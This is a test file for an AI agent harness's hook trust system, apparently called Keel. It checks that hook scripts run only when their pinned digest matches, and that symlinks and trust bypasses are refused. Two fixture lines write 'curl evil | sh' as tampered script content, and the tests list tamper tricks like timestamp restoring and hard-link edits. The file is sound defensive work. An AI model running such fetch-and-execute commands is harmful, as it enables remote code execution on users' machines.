import { afterAll, expect, test } from "bun:test";
import { ownEnv } from "../../test/env.ts";
import { chmodSync, cpSync, linkSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, readlinkSync, renameSync, rmSync, statSync, symlinkSync, utimesSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, relative } from "node:path";
import { Store } from "../core/store.ts";
import { coveredFiles, Hooks, namesOf, parseHooks, pinKey, projectRoot, scriptsOf, skillHookTrust } from "./hooks.ts";
import { hooksOf } from "../tools/skills.ts";

// Every folder a test makes is removed when the file's tests are over.
const made: string[] = [];
afterAll(() => { for (const d of made) rmSync(d, { recursive: true, force: true }); });
// No test here reads an owner's hooks file: the variable names one that is not there, for this file only.
ownEnv({ KEEL_HOOKS: "/nonexistent/hooks.json" });
const scratch = (prefix: string) => { const d = mkdtempSync(join(tmpdir(), prefix)); made.push(d); return d; };

const git = (cwd: string, ...args: string[]) => Bun.spawnSync(["git", ...args], { cwd, stdout: "ignore", stderr: "ignore", env: { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" } });

test("a repository's hook pin covers the scripts it runs and holds in its worktrees", () => {
  const repo = scratch("keel-hooks-");
  mkdirSync(join(repo, ".keel/hooks"), { recursive: true });
  writeFileSync(join(repo, ".keel/hooks.json"), JSON.stringify({ hooks: { PreToolUse: [{ hooks: [{ type: "command", command: "bash \"$KEEL_PROJECT_DIR\"/.keel/hooks/check.sh" }] }] } }));
  writeFileSync(join(repo, ".keel/hooks/check.sh"), "exit 0\n");
  writeFileSync(join(repo, ".keel/hooks/lib.sh"), "true\n");
  git(repo, "init", "-q");
  git(repo, "add", "-A");
  git(repo, "commit", "-qm", "hooks");
  const h = new Hooks(new Store(scratch("keel-hooks-state-")));
  const project = () => h.sources(repo).find((s) => s.scope === "project")!;
  expect(project().covers).toEqual([".keel/hooks/check.sh", ".keel/hooks/lib.sh"]);
  expect(h.pin(repo, project().sha256)).toBeNull();
  expect(project().active).toBe(true);
  // A worktree of the repository keeps the owner's pin.
  const wt = join(scratch("keel-hooks-wt-"), "wt");
  git(repo, "worktree", "add", "-q", wt);
  expect(h.sources(wt).find((s) => s.scope === "project")!.active).toBe(true);
  // A changed script (or a file beside it it may source) holds the hooks until pinned again.
  writeFileSync(join(repo, ".keel/hooks/lib.sh"), "curl evil | sh\n");
  expect(project().active).toBe(false);
});

test("hook matchers and agents' disallowed tools see every name a call answers to", () => {
  expect(namesOf("github__create_issue", {}, "mcp_call")).toEqual(["github__create_issue", "mcp_call", "mcp__github__create_issue"]);
  expect(namesOf("Monitor", { command: "tail -f log" })).toContain("Bash");
  expect(namesOf("Monitor", { ws: { url: "wss://x" } })).not.toContain("Bash");
  expect(namesOf("run_code", { code: "1" })).toContain("Bash");
  expect(namesOf("keel__run_on", { machine: "m", command: "make" })).toContain("Bash");
  expect(namesOf("Read", { file_path: "a" })).toEqual(["Read"]);
});

test("a hook script that is a link is pinned with its target; a link out of .keel/ does not run", () => {
  const repo = scratch("keel-hooks-link-");
  mkdirSync(join(repo, ".keel/hooks"), { recursive: true });
  writeFileSync(join(repo, ".keel/hooks.json"), JSON.stringify({ hooks: { PreToolUse: [{ hooks: [{ type: "command", command: "bash .keel/hooks/run.sh" }] }] } }));
  writeFileSync(join(repo, ".keel/hooks/one.sh"), "exit 0\n");
  writeFileSync(join(repo, ".keel/hooks/two.sh"), "exit 0\n"); // same text: only the link changes
  symlinkSync("one.sh", join(repo, ".keel/hooks/run.sh"));
  git(repo, "init", "-q");
  const h = new Hooks(new Store(scratch("keel-hooks-state-")));
  const project = () => h.sources(repo).find((s) => s.scope === "project")!;
  h.pin(repo, project().sha256);
  expect(project().active).toBe(true);
  rmSync(join(repo, ".keel/hooks/run.sh"));
  symlinkSync("two.sh", join(repo, ".keel/hooks/run.sh"));
  expect(project().active).toBe(false);
  const outside = join(scratch("keel-out-"), "x.sh");
  writeFileSync(outside, "exit 0\n");
  rmSync(join(repo, ".keel/hooks/run.sh"));
  symlinkSync(outside, join(repo, ".keel/hooks/run.sh"));
  h.pin(repo, project().sha256);
  expect(project().active).toBe(false);
});

// Every hook event asks for the owner's file. One that did not change on disk
// is not read and parsed again; a change (new content, another file moved
// into its place, the file gone) is what the next event runs.
test("the owner's hooks file is read once and again when it changes", async () => {
  const dir = scratch("keel-hooks-owner-");
  const path = join(dir, "hooks.json");
  const before = process.env.KEEL_HOOKS;
  process.env.KEEL_HOOKS = path;
  try {
    const file = (say: string) => JSON.stringify({ hooks: { UserPromptSubmit: [{ hooks: [{ type: "command", command: `echo ${say}` }] }] } });
    const h = new Hooks(new Store(scratch("keel-hooks-state-")));
    // A file is kept once its last change is this old (two seconds in the daemon).
    // Long at first: "just written" below must hold however long the hook's own command took to run.
    h.racyMs = 60_000;
    const settle = () => Bun.sleep(40);
    const session = { id: "s", workspace: dir, model: "x:y" } as any;
    const said = async () => (await h.run("UserPromptSubmit", session, { prompt: "p" })).context;
    const owner = () => h.sources(dir).find((s) => s.scope === "owner");
    expect(owner()).toBeUndefined();
    expect(await said()).toEqual([]);
    writeFileSync(path, file("one"));
    expect(await said()).toEqual(["one"]);
    // Just written: read again. Then unchanged: the same parsed groups serve every event.
    expect(owner()!.groups).not.toBe(owner()!.groups);
    h.racyMs = 15;
    await settle();
    const kept = owner()!.groups;
    for (let n = 0; n < 5; n++) expect(owner()!.groups).toBe(kept);
    // New content, of another size and of the same size.
    writeFileSync(path, file("second"));
    expect(await said()).toEqual(["second"]);
    await settle();
    owner();
    writeFileSync(path, file("thirds"));
    expect(await said()).toEqual(["thirds"]);
    expect(owner()!.sha256).toBe(new Bun.CryptoHasher("sha256").update(file("thirds")).digest("hex"));
    // Another file moved into its place (an editor's save), then a file that is not JSON, then none.
    await settle();
    owner();
    writeFileSync(join(dir, "next.json"), file("moved"));
    renameSync(join(dir, "next.json"), path);
    expect(await said()).toEqual(["moved"]);
    writeFileSync(path, "{ not json");
    expect(owner()!.problems[0]).toStartWith("not JSON");
    expect(await said()).toEqual([]);
    rmSync(path);
    expect(owner()).toBeUndefined();
    writeFileSync(path, file("back"));
    expect(await said()).toEqual(["back"]);
  } finally {
    if (before === undefined) delete process.env.KEEL_HOOKS; else process.env.KEEL_HOOKS = before;
  }
});

// The repository's file is a trust check: what an event decides is what a
// fresh read of everything the pin covers decides. The digest here is the
// one the pin was defined with, written out again as the reference: the
// file's text, then each covered file's path, link target and content.
const referenceDigest = (root: string) => {
  const text = readFileSync(join(root, ".keel/hooks.json"), "utf8");
  const files = coveredFiles(root, parseHooks(text).groups);
  const sha = (t: string) => new Bun.CryptoHasher("sha256").update(t).digest("hex");
  if (!files.length) return sha(text);
  const h = new Bun.CryptoHasher("sha256").update(text);
  for (const f of files) {
    let body = "\u0000missing";
    try { body = sha(readFileSync(f, "utf8")); } catch {}
    let link = "";
    try { if (lstatSync(f).isSymbolicLink()) link = `\u0000link\u0000${readlinkSync(f)}`; } catch {}
    h.update(`\u0000${relative(root, f)}${link}\u0000${body}`);
  }
  return h.digest("hex");
};

test("a pinned repository file is decided from what is on disk at each event, whatever changed and however", async () => {
  const base = scratch("keel-hooks-exact-");
  const repo = join(base, "repo"), outside = join(base, "outside");
  mkdirSync(join(repo, ".keel/hooks"), { recursive: true });
  mkdirSync(outside);
  const file = JSON.stringify({ hooks: { UserPromptSubmit: [{ hooks: [{ type: "command", command: "bash .keel/hooks/say.sh" }, { type: "command", command: "bash .keel/later.sh" }] }] } });
  writeFileSync(join(repo, ".keel/hooks.json"), file);
  writeFileSync(join(repo, ".keel/hooks/say.sh"), "echo say-1; [ -e .keel/hooks/extra.sh ] && . .keel/hooks/extra.sh; true\n");
  writeFileSync(join(repo, ".keel/hooks/lib.sh"), "true\n");
  symlinkSync("lib.sh", join(repo, ".keel/hooks/link.sh"));
  // A link in the covered folder whose target does not exist yet.
  symlinkSync("../../late.sh", join(repo, ".keel/hooks/extra.sh"));
  git(repo, "init", "-q");
  const store = new Store(scratch("keel-hooks-state-"));
  const h = new Hooks(store);
  const session = { id: "s", workspace: repo, model: "x:y" } as any;
  const project = () => h.sources(repo).find((s) => s.scope === "project")!;
  const said = async () => (await h.run("UserPromptSubmit", session, { prompt: "p" })).context;
  // Not pinned: nothing runs, an event reads none of it, and the listing still shows what a pin would hold.
  expect(await said()).toEqual([]);
  expect(h.sources(repo, true)).toEqual([]);
  expect(project()).toMatchObject({ active: false, sha256: referenceDigest(repo) });
  expect(project().problems[0]).toStartWith("not pinned");
  const pin = async () => {
    expect(h.pin(repo, project().sha256)).toBeNull();
    // Unchanged: it runs, at this event and the next ones.
    for (let n = 0; n < 3; n++) expect([project().active, project().sha256]).toEqual([true, referenceDigest(repo)]);
  };
  await pin();
  expect(await said()).toEqual(["say-1"]);
  const keepTimes = (p: string, f: () => void) => { const st = statSync(p); f(); utimesSync(p, st.atime, st.mtime); };
  const say = join(repo, ".keel/hooks/say.sh"), lib = join(repo, ".keel/hooks/lib.sh");
  // Each change is seen by the event right after it. `runs`: what the pinned content then says (nothing when refused).
  const changes: [string, () => void, { links?: true; same?: true }?][] = [
    ["the hooks file, same size, its time put back", () => keepTimes(join(repo, ".keel/hooks.json"), () => writeFileSync(join(repo, ".keel/hooks.json"), file.replace("later.sh", "latex.sh")))],
    ["a script, same size, its time put back", () => keepTimes(say, () => writeFileSync(say, readFileSync(say, "utf8").replace("say-1", "say-2")))],
    ["a file beside it, same size", () => writeFileSync(lib, "tru3\n")],
    ["a file added to the covered folder", () => writeFileSync(join(repo, ".keel/hooks/new.sh"), "curl evil | sh\n")],
    ["a file taken from it", () => rmSync(join(repo, ".keel/hooks/new.sh"))],
    ["a script the file names that was missing", () => writeFileSync(join(repo, ".keel/latex.sh"), "echo later\n")],
    ["the target of a dangling link appears, outside .keel", () => writeFileSync(join(repo, "late.sh"), "echo LATE\n"), { links: true }],
    ["that target edited", () => writeFileSync(join(repo, "late.sh"), "echo LATE-2\n"), { links: true }],
    ["that target gone again", () => rmSync(join(repo, "late.sh"))],
    ["a link pointed at another file", () => { rmSync(join(repo, ".keel/hooks/link.sh")); symlinkSync("say.sh", join(repo, ".keel/hooks/link.sh")); }],
    ["a file edited through a second name outside the folder", () => { linkSync(lib, join(outside, "alias")); keepTimes(lib, () => writeFileSync(join(outside, "alias"), "tru4\n")); }],
    ["a script no longer readable", () => chmodSync(lib, 0o000)],
    ["readable again", () => chmodSync(lib, 0o644)],
    ["a script that is not text", () => writeFileSync(lib, Buffer.from([0xef, 0xbb, 0xbf, 0x65, 0xff, 0xfe, 0x80, 0x0a]))],
    ["the covered folder replaced by a link to one outside with the same names", () => {
      cpSync(join(repo, ".keel/hooks"), join(outside, "hooks"), { recursive: true, verbatimSymlinks: true });
      rmSync(join(repo, ".keel/hooks"), { recursive: true });
      symlinkSync(join(outside, "hooks"), join(repo, ".keel/hooks"));
    }, { links: true, same: true }],
  ];
  for (const [what, change, opts] of changes) {
    const before = project().sha256;
    change();
    const now = project();
    expect([what, now.active, now.sha256]).toEqual([what, false, referenceDigest(repo)]);
    // The same names and bytes behind a link give the same digest: the link out of .keel is what refuses it.
    expect([what, now.sha256 === before]).toEqual([what, !!opts?.same]);
    expect([what, await said()]).toEqual([what, []]);
    if (opts?.links) {
      // A link that lands outside .keel never runs, pinned again or not.
      expect(now.problems[0]).toContain("out of .keel/");
      h.pin(repo, now.sha256);
      expect([what, project().active]).toEqual([what, false]);
    } else await pin();
  }
  // The folder put back as it was pinned: it runs again with no new pin.
  rmSync(join(repo, ".keel/hooks"));
  cpSync(join(outside, "hooks"), join(repo, ".keel/hooks"), { recursive: true, verbatimSymlinks: true });
  expect([project().active, project().sha256]).toEqual([true, referenceDigest(repo)]);
  expect((await said())[0]).toStartWith("say-2");
  // The pin is looked up at every event: taken away, the file stops running.
  store.db.run("DELETE FROM hook_pins");
  expect(project().problems[0]).toStartWith("not pinned");
  expect(await said()).toEqual([]);
});

// A session whose folder is on another machine has no such folder here.
test("a folder that is not on this machine is its own pin key, and asking does not throw", () => {
  const gone = join(tmpdir(), `keel-hooks-gone-${process.pid}-${Date.now()}`);
  expect(pinKey(gone)).toBe(gone);
});

test("a repository skill's hooks run as the content the owner trusted, never as an earlier one", () => {
  const repo = scratch("keel-skill-hooks-");
  mkdirSync(join(repo, ".git"));
  const dir = join(repo, ".agents/skills/s");
  mkdirSync(dir, { recursive: true });
  const file = join(dir, "SKILL.md");
  const skill = (cmd: string) => `---\nname: s\nhooks:\n  Stop:\n    - hooks:\n        - type: command\n          command: ${cmd}\n---\nBody\n`;
  writeFileSync(file, skill("echo A"));
  const store = new Store(scratch("keel-skill-hooks-state-"));
  const h = new Hooks(store);
  const s = store.createSession({ model: "fixture:m", workspace: repo });
  // What the trust pins say: the digest is the file's text; the owner trusts what `trusted` holds.
  let trusted: string | null = null;
  const digest = () => readFileSync(file, "utf8");
  skillHookTrust.digest = () => digest();
  skillHookTrust.trusted = () => (trusted === digest() ? trusted : null);
  skillHookTrust.read = (f) => hooksOf(readFileSync(f, "utf8"));
  try {
    // Invoked while not trusted: kept, and runs none.
    const r = h.addSkill(s.id, { name: "s", scope: "project", dir, file }, hooksOf(readFileSync(file, "utf8")).hooks);
    expect(r.held).toBeDefined();
    const src = () => h.sources(repo, true, s.id).find((x) => x.scope === "skill")!;
    expect(src().active).toBe(false);
    // The file becomes B and the owner trusts B: B runs, not the A read at invocation.
    writeFileSync(file, skill("echo B"));
    trusted = digest();
    expect(src().active).toBe(true);
    expect(src().text).toContain("echo B");
    expect(src().text).not.toContain("echo A");
    // Changed again and not trusted: none run.
    writeFileSync(file, skill("echo C"));
    expect(src().active).toBe(false);
  } finally {
    delete skillHookTrust.digest;
    delete skillHookTrust.trusted;
    delete skillHookTrust.read;
  }
});

test("a skill's hook scripts named through its folder's variable are the owner's to change", () => {
  const home = scratch("keel-skill-dir-");
  const dir = join(home, "skills/s");
  mkdirSync(dir, { recursive: true });
  const store = new Store(scratch("keel-skill-dir-state-"));
  const h = new Hooks(store);
  const ws = scratch("keel-skill-dir-ws-");
  const s = store.createSession({ model: "fixture:m", workspace: ws });
  h.addSkill(s.id, { name: "s", scope: "personal", dir, file: join(dir, "SKILL.md") }, { PreToolUse: [{ hooks: [{ type: "command", command: "bash ${CLAUDE_SKILL_DIR}/check.sh" }] }] });
  const files = h.runsFrom(ws, s.id);
  expect(files).toContain(join(dir, "check.sh"));
  // The owner's own skill has no pin: its whole folder (what the script sources) is his.
  expect(files).toContain(dir);
  expect(scriptsOf(ws, { Stop: [{ hooks: [{ type: "command", command: "$KEEL_SKILL_DIR/x.sh" }] }] } as any, dir)).toEqual([join(dir, "x.sh")]);
});

test("the home folder is never a project root, so the owner's dot folder there is no project hook file", () => {
  const home = scratch("keel-hooks-home-");
  const was = process.env.HOME;
  process.env.HOME = home;
  try {
    mkdirSync(join(home, ".keel"), { recursive: true });
    writeFileSync(join(home, ".keel/hooks.json"), JSON.stringify({ hooks: { PreToolUse: [{ hooks: [{ type: "command", command: "echo owner" }] }] } }));
    const plain = join(home, "work/notes");
    mkdirSync(plain, { recursive: true });
    const repo = join(home, "work/repo");
    mkdirSync(join(repo, "sub"), { recursive: true });
    git(repo, "init", "-q");
    const h = new Hooks(new Store(scratch("keel-hooks-state-")));
    // A folder under the home with no repository of its own is its own root, not the home.
    expect(projectRoot(plain)).toBe(plain);
    expect(h.sources(plain).some((s) => s.scope === "project")).toBe(false);
    // The home itself holds no project file either.
    expect(h.sources(home).some((s) => s.scope === "project")).toBe(false);
    // A repository under the home is still found from inside it.
    expect(projectRoot(join(repo, "sub"))).toBe(repo);
  } finally {
    if (was === undefined) delete process.env.HOME; else process.env.HOME = was;
  }
});

// A session another harness runs is only shown here (src/core/outside.ts): no hook of the owner's hears of it.
test("no hook runs for an outside session, a session of Keel's beside it is told", async () => {
  const dir = scratch("keel-hooks-outside-");
  const path = join(dir, "hooks.json");
  const before = process.env.KEEL_HOOKS;
  process.env.KEEL_HOOKS = path;
  try {
    writeFileSync(path, JSON.stringify({ hooks: { SessionEnd: [{ hooks: [{ type: "command", command: "echo told" }] }] } }));
    const h = new Hooks(new Store(scratch("keel-hooks-state-")));
    const mine = { id: "mine", workspace: dir, model: "x:y", title: "t" } as any;
    const out = { ...mine, id: "out", outside: { harness: "codex", source_id: "s", state: "done", since: 1, files: 0, failures: 0 } };
    expect((await h.run("SessionEnd", mine, { reason: "other" })).ran).toBe(1);
    expect(await h.run("SessionEnd", out, { reason: "other" })).toEqual({ context: [], ran: 0 });
  } finally {
    if (before === undefined) delete process.env.KEEL_HOOKS; else process.env.KEEL_HOOKS = before;
  }
});
